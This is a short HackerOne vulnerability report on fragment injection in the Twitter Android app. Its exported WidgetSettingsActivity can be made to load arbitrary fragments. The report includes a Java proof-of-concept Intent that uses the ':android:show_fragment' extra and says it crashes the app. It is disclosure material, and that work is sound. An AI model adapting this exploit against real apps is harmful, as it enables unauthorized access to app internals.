# HackerOne Report: twitter android app Fragment Injection
**Report ID:** 43988
**Vulnerability Class:** Command Injection - Generic

## Vulnerability Information & PoC
com.twitter.android.WidgetSettingsActivity extend PreferenceActivity and export.
By entering the appropriate extra intent can call any of its internal fragment.
So do not export com.twitter.android.WidgetSettingsActivity
（http://securityintelligence.com/new-vulnerability-android-framework-fragment-injection）

POC：(can make app crash)
private void testtwitter(){
        Intent i = new Intent();
        i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
        i.setClassName("com.twitter.android","com.twitter.android.WidgetSettingsActivity");
        i.putExtra(":android:show_fragment","com.samsung.android.sdk.pen.objectruntime.preload.VideoIntentFragment");
        //i.putExtra("confirmcredentials",false);
        startActivity(i);
	}

## Discussion & Remediation Timeline
